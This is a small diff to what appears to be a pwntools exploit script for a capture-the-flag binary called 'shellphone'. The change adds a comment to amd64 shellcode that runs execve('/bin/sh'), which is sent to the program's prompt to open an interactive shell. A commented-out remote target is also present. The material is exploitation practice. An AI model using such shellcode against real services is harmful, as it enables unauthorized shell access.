@@ -11,6 +11,7 @@ p = gdb.debug('./shellphone', '''
 
 # p = remote('52.8.15.62', 8006)
 
+# shellcode injection to execute execve("/bin/sh", NULL, NULL)
 shellcode = asm('''
     xor rsi, rsi
     push rsi
@@ -22,7 +23,6 @@ shellcode = asm('''
     mov al, 0x3b
     syscall
 ''', arch='amd64')
-
 p.sendlineafter(b'giv me sm shllcde & i\'ll run it. keep it shrt!', shellcode)
 
 p.interactive()
